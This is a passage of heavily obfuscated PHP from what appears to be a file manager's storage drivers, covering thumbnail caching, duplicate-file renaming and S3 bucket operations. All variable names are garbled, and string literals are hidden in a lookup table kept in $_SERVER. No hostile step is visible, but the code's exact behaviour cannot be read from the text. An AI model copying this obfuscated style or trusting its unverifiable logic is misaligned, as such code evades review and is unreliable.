unset($Å§É˜ª¯[$¶ÁÛÛŠ†]); return; } if (!is_null($²Ô„ò¼ )) { $Å§É˜ª¯[$¶ÁÛÛŠ†] = $²Ô„ò¼ ; return; } $ÅƒÚù¡ = isset($Å§É˜ª¯[$¶ÁÛÛŠ†]) ? $Å§É˜ª¯[$¶ÁÛÛŠ†] : null; if (!is_null($ÅƒÚù¡)) { return $ÅƒÚù¡; } $ÅƒÚù¡ = $this->{$íŒ‰ÜŸÌ}($œßù©ÅÇ); $Å§É˜ª¯[$¶ÁÛÛŠ†] = $ÅƒÚù¡; return $ÅƒÚù¡; } public function cacheMethodInfoSet($Ê ¬€¨, $İ¼—ó‰ë, $‰öÒ÷¯— = false) { $÷é¾×¿— =& $_SERVER[¹Éµ„ºå]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($÷é¾×¿—[177], $Ê ¬€¨, $İ¼—ó‰ë); $this->cacheMethod($÷é¾×¿—[178], $Ê ¬€¨, $İ¼—ó‰ë ? !1 : !0); if (is_array($‰öÒ÷¯—)) { $this->cacheMethod($÷é¾×¿—[179], $Ê ¬€¨, $‰öÒ÷¯—); } } public function fileOutImage($ƒà¯«Êª, $Î¸€íó¥ = 250) { $§ŸŸšŞ€ =& $_SERVER[¹Éµ„ºå]; set_timeout(); if (substr($ƒà¯«Êª, 0, 4) == $§ŸŸšŞ€[149]) { $this->fileOutLink($ƒà¯«Êª); } $öñš‘èØ = $this->info($ƒà¯«Êª); $¦É…Ø€ = !1; $ÀóİØäŒ = isset($GLOBALS[$§ŸŸšŞ€[180]]) ? $GLOBALS[$§ŸŸšŞ€[180]] : array(); if ($ÀóİØäŒ && $ÀóİØäŒ[$§ŸŸšŞ€[181]] == $öñš‘èØ[$§ŸŸšŞ€[87]]) { $öñš‘èØ = $ÀóİØäŒ; $°»Á¯Ø = $öñš‘èØ[$§ŸŸšŞ€[182]]; if ($°»Á¯Ø && isset($°»Á¯Ø[$§ŸŸšŞ€[183]])) { if ($°»Á¯Ø[$§ŸŸšŞ€[183]] <= $Î¸€íó¥ && $°»Á¯Ø[$§ŸŸšŞ€[184]] <= $Î¸€íó¥) { $¦É…Ø€ = !0; } } } if ($öñš‘èØ[$§ŸŸšŞ€[79]] <= 1024 * 50 || $¦É…Ø€ || !function_exists($§ŸŸšŞ€[185]) || $öñš‘èØ[$§ŸŸšŞ€[166]] == $§ŸŸšŞ€[186]) { return $this->fileOut($ƒà¯«Êª, !1, $öñš‘èØ[$§ŸŸšŞ€[32]]); } $±™ˆÂŞ = kodIO::hashPath($öñš‘èØ); $£äñêæ‹ = "\143\x6f\x76\145\x72\x5f{$±™ˆÂŞ}\x5f{$Î¸€íó¥}\x2e\x70\x6e\147"; $²ë§Ç‹õ = IO_PATH_SYSTEM_TEMP . $§ŸŸšŞ€[187]; $˜ƒ¼ì³½ = IO::infoFullSimple($²ë§Ç‹õ); $†Õ›ıÌÍ = $˜ƒ¼ì³½ && is_array($˜ƒ¼ì³½) ? $˜ƒ¼ì³½[$§ŸŸšŞ€[87]] : $§ŸŸšŞ€[12]; if (!$†Õ›ıÌÍ) { $†Õ›ıÌÍ = IO::mkdir($²ë§Ç‹õ); } if ($öñš‘èØ[$§ŸŸšŞ€[188]] == $§ŸŸšŞ€[189] && isset($öñš‘èØ[$§ŸŸšŞ€[190]]) && $öñš‘èØ[$§ŸŸšŞ€[190]] == kodIO::sourceID($†Õ›ıÌÍ)) { $™¿ë¶Ûï = $öñš‘èØ[$§ŸŸšŞ€[191]]; if ($Î¸€íó¥ <= 500) { $×”òÍ¸ö = preg_replace($§ŸŸšŞ€[192], $§ŸŸšŞ€[193], $öñš‘èØ[$§ŸŸšŞ€[32]]); $™¿ë¶Ûï = IO::fileNameExist($†Õ›ıÌÍ, $×”òÍ¸ö); } return IO::fileOut(KodIO::make($™¿ë¶Ûï), !1, $öñš‘èØ[$§ŸŸšŞ€[32]]); } $ñŸƒ¢çŠ = IO::fileNameExist($†Õ›ıÌÍ, $£äñêæ‹); if ($ñŸƒ¢çŠ) { return IO::fileOut(KodIO::make($ñŸƒ¢çŠ), !1, $öñš‘èØ[$§ŸŸšŞ€[32]]); } if ($Î¸€íó¥ > 1000) { $this->makeImageCover($†Õ›ıÌÍ, $ƒà¯«Êª, $£äñêæ‹, $Î¸€íó¥); $this->makeImageCover($†Õ›ıÌÍ, $ƒà¯«Êª, "\143\157\166\145\x72\137{$±™ˆÂŞ}\137\62\65\60\56\x70\156\147", 250); $ñŸƒ¢çŠ = IO::fileNameExist($†Õ›ıÌÍ, $£äñêæ‹); if ($ñŸƒ¢çŠ) { return IO::fileOut(KodIO::make($ñŸƒ¢çŠ), !1, $öñš‘èØ[$§ŸŸšŞ€[32]]); } die; } if (!kodIO::allowCover($öñš‘èØ)) { return $this->fileOut($ƒà¯«Êª, !1, $öñš‘èØ[$§ŸŸšŞ€[32]]); } $·–ÌË¥â = Cache::get($£äñêæ‹); if ($·–ÌË¥â == $§ŸŸšŞ€[194] || $·–ÌË¥â == $§ŸŸšŞ€[195]) { echo $·–ÌË¥â; die; } Cache::set($£äñêæ‹, $§ŸŸšŞ€[195], 60); $îù½ÑŠü = array($†Õ›ıÌÍ, $öñš‘èØ[$§ŸŸšŞ€[87]], $£äñêæ‹, $Î¸€íó¥); $’ŠÇ­›¤ = $§ŸŸšŞ€[196] . $öñš‘èØ[$§ŸŸšŞ€[79]] . $§ŸŸšŞ€[197] . $£äñêæ‹ . $§ŸŸšŞ€[198] . $öñš‘èØ[$§ŸŸšŞ€[32]] . $§ŸŸšŞ€[199] . $öñš‘èØ[$§ŸŸšŞ€[87]]; TaskQueue::add($§ŸŸšŞ€[200], $îù½ÑŠü, $’ŠÇ­›¤, $£äñêæ‹); } public function makeImageCover($ÍØµ……, $„¡ŸÆŒ, $¦¶´ÊˆÜ, $ôò¸ãÜÆ) { $ôğ¾®èã =& $_SERVER[¹Éµ„ºå]; if (IO::fileNameExist($ÍØµ……, $¦¶´ÊˆÜ)) { return $ôğ¾®èã[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ğ¤¤ÔØŸ = $this->getPathOuter($„¡ŸÆŒ); $ÌÂÓŒöÜ = DATA_THUMB . $¦¶´ÊˆÜ; del_file($ÌÂÓŒöÜ); $”œòí±° = IO::copy($ğ¤¤ÔØŸ, TEMP_FILES, !1, $¦¶´ÊˆÜ); if (!@file_exists($”œòí±°)) { return $ôğ¾®èã[202]; } ImageThumb::createThumb($”œòí±°, $ÌÂÓŒöÜ, $ôò¸ãÜÆ, $ôò¸ãÜÆ * 10); if (@file_exists($ÌÂÓŒöÜ)) { Cache::remove($¦¶´ÊˆÜ); return IO::move($ÌÂÓŒöÜ, $ÍØµ……); } Cache::set($¦¶´ÊˆÜ, $ôğ¾®èã[194], 600); del_file($ÌÂÓŒöÜ); return $ôğ¾®èã[203] . $”œòí±° . $ôğ¾®èã[74]; } public function fileOutImageServer($Å³ûçÜâ, $Œ†……¹ = 250) { $this->fileOutImage($Å³ûçÜâ, $Œ†……¹); } public function fileNameAuto($Ä‚ÔÙ÷ó, $á¾Ù×¿, $ßœ¹úé• = REPEAT_RENAME, $È¶Ò×­¿ = false) { $ĞøÈ­ù£ =& $_SERVER[¹Éµ„ºå]; $ËÅš±ãÎ = $Ä‚ÔÙ÷ó === $ĞøÈ­ù£[12] ? $á¾Ù×¿ : rtrim($Ä‚ÔÙ÷ó, $ĞøÈ­ù£[8]) . $ĞøÈ­ù£[8] . $á¾Ù×¿; if ($ßœ¹úé• == REPEAT_REPLACE || !$this->exist($ËÅš±ãÎ) || $È¶Ò×­¿ && $ßœ¹úé• != REPEAT_RENAME_FOLDER) { return $á¾Ù×¿; } if ($ßœ¹úé• == REPEAT_SKIP) { return !1; } $Áìö‚ê• = $ĞøÈ­ù£[10] . get_path_ext($á¾Ù×¿); $Áìö‚ê• = $Áìö‚ê• == $ĞøÈ­ù£[10] || $È¶Ò×­¿ ? $ĞøÈ­ù£[12] : $Áìö‚ê•; $¡–Ô‹¡Û = 1; $Öõ•ˆÂµ = substr($á¾Ù×¿, 0, strlen($á¾Ù×¿) - strlen($Áìö‚ê•)); $Éé¼Ï² = $Öõ•ˆÂµ . "\50{$¡–Ô‹¡Û}\x29{$Áìö‚ê•}"; while ($this->exist(rtrim($Ä‚ÔÙ÷ó, $ĞøÈ­ù£[8]) . $ĞøÈ­ù£[8] . $Éé¼Ï²)) { $Éé¼Ï² = $Öõ•ˆÂµ . "\50{$¡–Ô‹¡Û}\51{$Áìö‚ê•}"; $¡–Ô‹¡Û++; } return $Éé¼Ï²; } private function fileNameAutoList($ª²ĞÑ·ˆ, $­ßáŠØµ, $±ğ¶”ÖÖ = false) { $˜ñ¹·£¹ =& $_SERVER[¹Éµ„ºå]; $—¿‹ÑóÎ = $this->listPath($ª²ĞÑ·ˆ, !0); $—¿‹ÑóÎ = array_merge($—¿‹ÑóÎ[$˜ñ¹·£¹[85]], $—¿‹ÑóÎ[$˜ñ¹·£¹[86]]); $ªñ…æ³¹ = array_to_keyvalue($—¿‹ÑóÎ, $˜ñ¹·£¹[12], $˜ñ¹·£¹[32]); $ë×œßøä = $˜ñ¹·£¹[10] . get_path_ext($­ßáŠØµ); $ë×œßøä = $ë×œßøä == $˜ñ¹·£¹[10] || $±ğ¶”ÖÖ ? $˜ñ¹·£¹[12] : $ë×œßøä; $ùÒïÄÛÍ = substr($­ßáŠØµ, 0, strlen($­ßáŠØµ) - strlen($ë×œßøä)); $Ã’ïô†— = $ùÒïÄÛÍ . "\x28\60\x29{$ë×œßøä}"; for ($Ï€Úßµ› = 1; $Ï€Úßµ› <= count($ªñ…æ³¹) + 1; $Ï€Úßµ›++) { $Ã’ïô†— = $ùÒïÄÛÍ . "\50{$Ï€Úßµ›}\51{$ë×œßøä}"; if (!in_array_not_case($Ã’ïô†—, $ªñ…æ³¹)) { return $Ã’ïô†—; } } return $Ã’ïô†—; } public function listAllFiles($şøŸ®‹«, $¾¤¾¬Ú€) { $½ÊôÚ›¶ =& $_SERVER[¹Éµ„ºå]; if (empty($¾¤¾¬Ú€)) { return array(); } $›İ ’è = array_keys($¾¤¾¬Ú€); $‘Ì…Øª¹ = array(); $şøŸ®‹« = trim($şøŸ®‹«, $½ÊôÚ›¶[8]); foreach ($¾¤¾¬Ú€ as $šáùŸš± => $»æ²½°) { $¨ôÖĞÜÈ = ltrim(substr(trim($šáùŸš±, $½ÊôÚ›¶[8]), strlen($şøŸ®‹«)), $½ÊôÚ›¶[8]); if (substr($šáùŸš±, -1) == $½ÊôÚ›¶[8]) { $¨ôÖĞÜÈ = rtrim($¨ôÖĞÜÈ, $½ÊôÚ›¶[8]) . $½ÊôÚ›¶[8]; } $‘Ì…Øª¹ = array_merge($‘Ì…Øª¹, $this->slicePath($¨ôÖĞÜÈ)); } $Ó¡àË² = array(); foreach (array_unique($‘Ì…Øª¹) as $¦¯İÙûÜ) { $Ì°‘ÔÍ = array($½ÊôÚ›¶[87] => $this->getPathOuter($½ÊôÚ›¶[8] . $şøŸ®‹« . $½ÊôÚ›¶[8] . $¦¯İÙûÜ), $½ÊôÚ›¶[78] => 1, $½ÊôÚ›¶[79] => 0); if (substr($¦¯İÙûÜ, -1) != $½ÊôÚ›¶[8]) { $Ì°‘ÔÍ[$½ÊôÚ›¶[78]] = 0; $úİÇŞ—« = $this->getPath($şøŸ®‹« . $½ÊôÚ›¶[8] . $¦¯İÙûÜ); if (isset($¾¤¾¬Ú€[$úİÇŞ—«])) { $üî÷À¿å = $¾¤¾¬Ú€[$úİÇŞ—«]; if (isset($üî÷À¿å[$½ÊôÚ›¶[79]])) { $Ì°‘ÔÍ[$½ÊôÚ›¶[79]] = intval($üî÷À¿å[$½ÊôÚ›¶[79]]); } if (isset($üî÷À¿å[$½ÊôÚ›¶[204]])) { $Ì°‘ÔÍ[$½ÊôÚ›¶[88]] = intval($üî÷À¿å[$½ÊôÚ›¶[204]]); } } } $Ó¡àË²[] = $Ì°‘ÔÍ; } return $Ó¡àË²; } public function slicePath($¨­¡ÎŞí) { $Ú¾¢¡ü =& $_SERVER[¹Éµ„ºå]; $Ã »É…Ö = explode($Ú¾¢¡ü[8], trim($¨­¡ÎŞí, $Ú¾¢¡ü[8])); $ÌŸÒÁÔÖ = 0; do { ++$ÌŸÒÁÔÖ; $¨†¢æ•[] = implode($Ú¾¢¡ü[8], array_slice($Ã »É…Ö, 0, $ÌŸÒÁÔÖ)) . $Ú¾¢¡ü[8]; } while ($ÌŸÒÁÔÖ < count($Ã »É…Ö)); $¨†¢æ•[count($Ã »É…Ö) - 1] = $¨­¡ÎŞí; return $¨†¢æ•; } public function getHost() { $„Ü¨Î­² =& $_SERVER[¹Éµ„ºå]; $ÚÉ‹õÎ = parse_url(trim($this->domain, $„Ü¨Î­²[8])); $©ŸÙ–£ = isset($ÚÉ‹õÎ[$„Ü¨Î­²[205]]) ? $ÚÉ‹õÎ[$„Ü¨Î­²[205]] : http_type(); $ª•Ú÷Âî = isset($ÚÉ‹õÎ[$„Ü¨Î­²[206]]) ? $ÚÉ‹õÎ[$„Ü¨Î­²[206]] : $ÚÉ‹õÎ[$„Ü¨Î­²[87]]; if (isset($ÚÉ‹õÎ[$„Ü¨Î­²[207]])) { $ª•Ú÷Âî .= $„Ü¨Î­²[4] . $ÚÉ‹õÎ[$„Ü¨Î­²[207]]; } return $©ŸÙ–£ . $„Ü¨Î­²[208] . $ª•Ú÷Âî; } public function pathEncode($­û‰ëø) { $±»„ı×È =& $_SERVER[¹Éµ„ºå]; return str_replace($±»„ı×È[209], $±»„ı×È[8], rawurlencode($­û‰ëø)); } public function writeLog($×«àÆÉ = '', $‹ŠÙùƒ‰ = false) { $Ş·Àñı =& $_SERVER[¹Éµ„ºå]; $ “äî = in_array(ACTION, array($Ş·Àñı[210], $Ş·Àñı[211])); if (!$ “äî && !GLOBAL_DEBUG) { return; } $Ïü Îşï = $×«àÆÉ; static $˜­¶Ø‰š = null; if (!$˜­¶Ø‰š) { $˜­¶Ø‰š = strtoupper($this->getType()); } $×«àÆÉ = $˜­¶Ø‰š . $Ş·Àñı[212] . $×«àÆÉ; if ($‹ŠÙùƒ‰) { $ùÉ­’ëå = error_get_last(); if ($ùÉ­’ëå) { $×«àÆÉ = array($×«àÆÉ, $ùÉ­’ëå); } } write_log($×«àÆÉ, $Ş·Àñı[213]); if ($ “äî) { throw new Exception($Ïü Îşï); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ìÅÅóü) { set_timeout(); require_once SDK_DIR . $_SERVER[¹Éµ„ºå][214]; parent::__construct(); $this->_init($ìÅÅóü); } public function _init($é¶ËÑ¯à) { $•“©—À© =& $_SERVER[¹Éµ„ºå]; $this->config = $é¶ËÑ¯à; foreach ($é¶ËÑ¯à as $Ä­ÌÚŠ  => $üÂÕË³å) { if (isset($this->{$Ä­ÌÚŠ })) { $this->{$Ä­ÌÚŠ } = $üÂÕË³å; } } $this->endpoint = $é¶ËÑ¯à[$•“©—À©[215]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $Û±İì   = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($Û±İì  , 0, 7) == $•“©—À©[216]) { $Û±İì   = $•“©—À©[217] . substr($Û±İì  , 7); } $this->client->setEndpoint($Û±İì  ); if (in_array(ACTION, array($•“©—À©[210], $•“©—À©[211]))) { $this->client->setExceptions(); } } public function setSignVersion($Õ¤ ½„ = "\166\x34") { $this->signVer = $Õ¤ ½„; $this->client->setSignVersion($Õ¤ ½„); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ÓÄ„§È) { return null; } } public function isBucketCors() { $™˜À†é =& $_SERVER[¹Éµ„ºå]; $ƒ®÷éü€ = $this->getBucketCors(); if (!$ƒ®÷éü€ || !is_array($ƒ®÷éü€)) { return !1; } if (!is_array($ƒ®÷éü€[$™˜À†é[218]])) { $ƒ®÷éü€[$™˜À†é[218]] = explode($™˜À†é[50], $ƒ®÷éü€[$™˜À†é[218]]); } if ($ƒ®÷éü€[$™˜À†é[219]] != $™˜À†é[220] || !in_array($™˜À†é[220], $ƒ®÷éü€[$™˜À†é[218]])) { return !1; } $Ô¼—â‰Â = array_map($™˜À†é[221], $ƒ®÷éü€[$™˜À†é[222]]); if (!is_array($Ô¼—â‰Â)) { $Ô¼—â‰Â = array(); } $Üõó‰¥ = array($™˜À†é[223], $™˜À†é[224], $™˜À†é[225], $™˜À†é[226], $™˜À†é[227]); $º×¨øø¸ = array_diff($Üõó‰¥, $Ô¼—â‰Â); return empty($º×¨øø¸); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($ Á˜§Á) { return $this->client->setRegion($ Á˜§Á); } public function mkfile($ À‘ Ê€, $©ûº±… = '', $É¿¯Ùëô = REPEAT_RENAME) { $ãÌĞ®«ë = $this->setContent($ À‘ Ê€, $©ûº±…); if ($ãÌĞ®«ë !== !1) { return $this->getPathOuter($ À‘ Ê€); } return !1; } public function mkdir($ËíĞÅÆ×, $ìÙ¥Ş¬ê = REPEAT_SKIP) { $€Ğù·’Ú =& $_SERVER[¹Éµ„ºå]; if (empty($ËíĞÅÆ×) && $ËíĞÅÆ× !== $€Ğù·’Ú[228]) { return !1; } if ($ìÙ¥Ş¬ê && $this->_isFolder($ËíĞÅÆ×)) { return $this->getPathOuter($ËíĞÅÆ×); } $ ¨…Óˆ´ = $this->setContent($ËíĞÅÆ×, $€Ğù·’Ú[12], !0); if ($ ¨…Óˆ´ !== !1) { return $this->getPathOuter($ËíĞÅÆ×); } return !1; } public function copyFile($ÄÆÁ¶‰Ç, $ÙÓ™›™‹, $”Œ§ÆĞ· = array()) { $İââ€Õ =& $_SERVER[¹Éµ„ºå]; $ßæ¦ ÉÈ = $this->objectMeta($ÄÆÁ¶‰Ç); if (!$ßæ¦ ÉÈ) { return !1; } if ($ßæ¦ ÉÈ[$İââ€Õ[79]] <= 1024 * 1024 * 200) { $¸¹«ôıÎ = $this->client->copyObject($this->bucket, $ÄÆÁ¶‰Ç, $this->bucket, $ÙÓ™›™‹, $İââ€Õ[229], $”Œ§ÆĞ·); } else { $¸¹«ôıÎ = $this->client->multiCopyObject($this->bucket, $ÄÆÁ¶‰Ç, $this->bucket, $ÙÓ™›™‹, $”Œ§ÆĞ·); } $¸¹«ôıÎ = $¸¹«ôıÎ ? $this->getPathOuter($ÙÓ™›™‹) : !1; return $¸¹«ôıÎ; } public function moveFile($ä»”¸¹á, $Ã¼ŞşÁê) { if ($this->copyFile($ä»”¸¹á, $Ã¼ŞşÁê)) { $this->delFile($ä»”¸¹á); return $this->getPathOuter($Ã¼ŞşÁê); } return !1; } public function delFile($œ…äğø¿) { return $this->client->deleteObject($this->bucket, $œ…äğø¿); } public function delFolder($£œ¥ÂÁƒ) { $˜¤ğôœí =& $_SERVER[¹Éµ„ºå]; if (!$this->exist($£œ¥ÂÁƒ)) { return !0; } $this->listItemCache = !1; $ãú•ë = $this->fileList($£œ¥ÂÁƒ); $this->listItemCache = !0; $€ĞĞĞ‚ = trim($£œ¥ÂÁƒ, $˜¤ğôœí[8]) . $˜¤ğôœí[8]; if (!empty($£œ¥ÂÁƒ) && $£œ¥ÂÁƒ !== $˜¤ğôœí[228] && !in_array($€ĞĞĞ‚, $ãú•ë[$˜¤ğôœí[85]])) { $ãú•ë[$˜¤ğôœí[85]][] = $€ĞĞĞ‚; } $æ¨àÅÔõ = $this->delByBatch($ãú•ë[$˜¤ğôœí[86]]); if (!$æ¨àÅÔõ) { return !1; } $æ¨àÅÔõ = $this->delByBatch($ãú•ë[$˜¤ğôœí[85]]); if (!$æ¨àÅÔõ) { return !1; } return $this->delFile($€ĞĞĞ‚); } private function delByBatch($Áé‚„™„) { foreach (array_chunk($Áé‚„™„, 1000) as $€Ù´ÙÈÓ) { $„…Ñ’ßÉ = $this->client->deleteObjects($this->bucket, $€Ù´ÙÈÓ); if (!$„…Ñ’ßÉ) { return !1; } } return !0; } public function rename($¼…¸‹¹, $ì´Åû®¡) { return $this->renameObject($¼…¸‹¹, $ì´Åû®¡); } public function listPath($ÈÃ‚şÊ›, $ç€œñŒº = false) { $Á…ÍÈÉØ =& $_SERVER[¹Éµ„ºå]; $É†ÂÜÛ = $this->fileList($ÈÃ‚şÊ›, $Á…ÍÈÉØ[8], !0); foreach ($É†ÂÜÛ[$Á…ÍÈÉØ[85]] as $¡˜¡–Œ¹ => $‹ğâÚã«) { $É†ÂÜÛ[$Á…ÍÈÉØ[85]][$¡˜¡–Œ¹] = $this->folderInfo($‹ğâÚã«, $ç€œñŒº, $‹ğâÚã«); } foreach ($É†ÂÜÛ[$Á…ÍÈÉØ[86]] as $¡˜¡–Œ¹ => $‹ğâÚã«) { $É†ÂÜÛ[$Á…ÍÈÉØ[86]][$¡˜¡–Œ¹] = $this->fileInfo($‹ğâÚã«[$Á…ÍÈÉØ[32]], $ç€œñŒº, $‹ğâÚã«); } return $É†ÂÜÛ; } protected function infoChildren($ìÃşÀ—„, &$˜ù—Ù×») { $¿ÜöåÏ¥ =& $_SERVER[¹Éµ„ºå]; $ÔĞµÑä¶ = $this->fileList($ìÃşÀ—„, $¿ÜöåÏ¥[12], !0); $˜ù—Ù×»[$¿ÜöåÏ¥[81]] += count($ÔĞµÑä¶[$¿ÜöåÏ¥[85]]); $˜ù—Ù×»[$¿ÜöåÏ¥[80]] += count($ÔĞµÑä¶[$¿ÜöåÏ¥[86]]); foreach ($ÔĞµÑä¶[$¿ÜöåÏ¥[86]] as $Àì°›İ) { if (!$Àì°›İ || !$Àì°›İ[$¿ÜöåÏ¥[79]]) { continue; } $˜ù—Ù×»[$¿ÜöåÏ¥[79]] += $Àì°›İ[$¿ÜöåÏ¥[79]]; } } private function fileInfo($üºÉ²Ë‚, $á°÷ÇÕé = false, $Ïì‹ë¾¨ = array()) { $Å”ÖÉß˜ =& $_SERVER[¹Éµ„ºå]; $ó‘Õ¨­á = array($Å”ÖÉß˜[32] => $this->pathThis($üºÉ²Ë‚), $Å”ÖÉß˜[87] => $this->getPathOuter($üºÉ²Ë‚), $Å”ÖÉß˜[33] => $Å”ÖÉß˜[230], $Å”ÖÉß˜[166] => $this->ext($üºÉ²Ë‚), $Å”ÖÉß˜[79] => isset($Ïì‹ë¾¨[$Å”ÖÉß˜[79]]) ? $Ïì‹ë¾¨[$Å”ÖÉß˜[79]] : 0); if ($á°÷ÇÕé) { return $ó‘Õ¨­á; } $ó‘Õ¨­á[$Å”ÖÉß˜[231]] = $ó‘Õ¨­á[$Å”ÖÉß˜[88]] = 0; $ó‘Õ¨­á[$Å”ÖÉß˜[232]] = $ó‘Õ¨­á[$Å”ÖÉß˜[233]] = !0; if (empty($Ïì‹ë¾¨)) { $Ïì‹ë¾¨ = $this->objectMeta($üºÉ²Ë‚); if (!$Ïì‹ë¾¨) { return $ó‘Õ¨­á; } } if (isset($Ïì‹ë¾¨[$Å”ÖÉß˜[234]]) && $Ïì‹ë¾¨[$Å”ÖÉß˜[234]]) { $ó‘Õ¨­á[$Å”ÖÉß˜[235]] = $Ïì‹ë¾¨[$Å”ÖÉß˜[234]]; } if (isset($Ïì‹ë¾¨[$Å”ÖÉß˜[204]])) { $ó‘Õ¨­á[$Å”ÖÉß˜[88]] = $Ïì‹ë¾¨[$Å”ÖÉß˜[204]]; } if (isset($Ïì‹ë¾¨[$Å”ÖÉß˜[79]])) { $ó‘Õ¨­á[$Å”ÖÉß˜[79]] = $Ïì‹ë¾¨[$Å”ÖÉß˜[79]]; } return $ó‘Õ¨­á; } private function folderInfo($€ôõÂ•, $«€±Ô¶Ü = false, $ŠãÑÀ»º = array()) { $¬Ğª±¡ =& $_SERVER[¹Éµ„ºå]; $æİ€·ÆŸ = array($¬Ğª±¡[32] => $this->pathThis($€ôõÂ•), $¬Ğª±¡[87] => $this->getPathOuter($¬Ğª±¡[8] . $€ôõÂ•), $¬Ğª±¡[33] => $¬Ğª±¡[78]); if ($«€±Ô¶Ü) { return $æİ€·ÆŸ; } $æİ€·ÆŸ[$¬Ğª±¡[231]] = $æİ€·ÆŸ[$¬Ğª±¡[88]] = 0; $æİ€·ÆŸ[$¬Ğª±¡[232]] = $æİ€·ÆŸ[$¬Ğª±¡[233]] = !0; if ($€ôõÂ• == $¬Ğª±¡[12]) { return $æİ€·ÆŸ; } if (empty($ŠãÑÀ»º)) { $ŠãÑÀ»º = $this->objectMeta(trim($€ôõÂ•, $¬Ğª±¡[8]) . $¬Ğª±¡[8]); } if (isset($ŠãÑÀ»º[$¬Ğª±¡[204]])) { $æİ€·ÆŸ[$¬Ğª±¡[231]] = $ŠãÑÀ»º[$¬Ğª±¡[204]]; } return $æİ€·ÆŸ; } private function fileList($Ÿı€ÍÔ, $ß§¯èª = '', $œ¨ùöÜ§ = 0) { $½½­ãÓÚ =& $_SERVER[¹Éµ„ºå]; $ı¯Ê‚ƒ— = rtrim($Ÿı€ÍÔ, $½½­ãÓÚ[8]) . $½½­ãÓÚ[8]; $Ãö¯‰¨ = $this->listObjs($ı¯Ê‚ƒ—, null, null, $ß§¯èª); if (!$Ãö¯‰¨) { return array($½½­ãÓÚ[85] => array(), $½½­ãÓÚ[86] => array()); } $ŸŸâƒ²ó = $¨ÊõÑÎ = array(); foreach ($Ãö¯‰¨[$½½­ãÓÚ[236]] as $„²üå³) { $›ñ‘îà  = $„²üå³[$½½­ãÓÚ[32]]; if ($›ñ‘îà  == $ı¯Ê‚ƒ—) { continue; } $óü‰š£ = isset($„²üå³[$½½­ãÓÚ[79]]) ? $„²üå³[$½½­ãÓÚ[79]] : 0; $šîû¢œ¬ = $óü‰š£ == 0 && substr($›ñ‘îà , strlen($›ñ‘îà ) - 1, 1) == $½½­ãÓÚ[8] ? !0 : !1; $this->cacheMethodInfoSet($›ñ‘îà , $šîû¢œ¬, $„²üå³); if ($šîû¢œ¬) { $ŸŸâƒ²ó[] = $›ñ‘îà ; continue; } $¨ÊõÑÎ[] = $œ¨ùöÜ§ ? $„²üå³ : $›ñ‘îà ; } foreach ($Ãö¯‰¨[$½½­ãÓÚ[237]] as $„²üå³) { $ŸŸâƒ²ó[] = $„²üå³[$½½­ãÓÚ[32]]; $this->cacheMethodInfoSet($„²üå³[$½½­ãÓÚ[32]], !0); } $this->cacheMethodInfoSet($Ÿı€ÍÔ, !0); return array($½½­ãÓÚ[85] => $ŸŸâƒ²ó, $½½­ãÓÚ[86] => $¨ÊõÑÎ); } private function listObjs($µç¸©¬©, $ªÇá’· = null, $çÚóêŒ• = null, $£„ŠÛŸÖ = null) { $Îã²ú’¥ =& $_SERVER[¹Éµ„ºå]; $µç¸©¬© = trim($µç¸©¬©, $Îã²ú’¥[8]); $ÒÎŞÑÙ = empty($µç¸©¬©) && $µç¸©¬© !== $Îã²ú’¥[228] ? $Îã²ú’¥[12] : $µç¸©¬© . $Îã²ú’¥[8]; return $this->client->getBucket($this->bucket, $ÒÎŞÑÙ, $ªÇá’·, $çÚóêŒ•, $£„ŠÛŸÖ, !0); } public function has($Œ®ª‘‘, $²ÙÌºÜè = false, $é¹Ò±‡¨ = true) { $şÊ”‰ÂĞ =& $_SERVER[¹Éµ„ºå]; $Œ®ª‘‘ = trim($Œ®ª‘‘, $şÊ”‰ÂĞ[8]); $¡Â‡¦¿‡ = empty($Œ®ª‘‘) && $Œ®ª‘‘ !== $şÊ”‰ÂĞ[228] ? $şÊ”‰ÂĞ[12] : $Œ®ª‘‘ . $şÊ”‰ÂĞ[8]; $Ô§¹ê‚ñ = null; $¾˜Æï£ß = 500; $±Ü€¿­Ô = $şÊ”‰ÂĞ[8]; $ä£Æ¬ºÓ = $îµ®â²¤ = array(); while (!0) { $™ƒ”Á‰– = $this->listObjs($Œ®ª‘‘, $Ô§¹ê‚ñ, $¾˜Æï£ß, $±Ü€¿­Ô); if (!$™ƒ”Á‰–) { break; } $Ô§¹ê‚ñ = $™ƒ”Á‰–[$şÊ”‰ÂĞ[238]]; $ÈøİÕ®² = $™ƒ”Á‰–[$şÊ”‰ÂĞ[236]]; $á×¤“Ì‘ = $™ƒ”Á‰–[$şÊ”‰ÂĞ[237]]; if (empty($ÈøİÕ®²) && empty($á×¤“Ì‘)) { break; } if (count($ÈøİÕ®²) == 1 && $ÈøİÕ®²[0][$şÊ”‰ÂĞ[32]] == $¡Â‡¦¿‡) { break; } if ($²ÙÌºÜè) { if (count($ÈøİÕ®²)) { $ÈøİÕ®² = array_column($ÈøİÕ®², $şÊ”‰ÂĞ[32]); $ä£Æ¬ºÓ = array_merge($ä£Æ¬ºÓ, $ÈøİÕ®²); } if (count($á×¤“Ì‘)) { $á×¤“Ì‘ = array_column($á×¤“Ì‘, $şÊ”‰ÂĞ[32]); $îµ®â²¤ = array_merge($îµ®â²¤, $á×¤“Ì‘); } if ($Ô§¹ê‚ñ === null) { break; } continue; } if ($é¹Ò±‡¨) { if (!empty($ÈøİÕ®²)) { if (count($ÈøİÕ®²) > 1 || isset($ÈøİÕ®²[0][$şÊ”‰ÂĞ[32]]) && $ÈøİÕ®²[0][$şÊ”‰ÂĞ[32]] != $¡Â‡¦¿‡) { return !0; } } } else { if (!empty($á×¤“Ì‘)) { return !0; } } if ($Ô§¹ê‚ñ === null) { break; } } if ($²ÙÌºÜè) { $ä£Æ¬ºÓ = 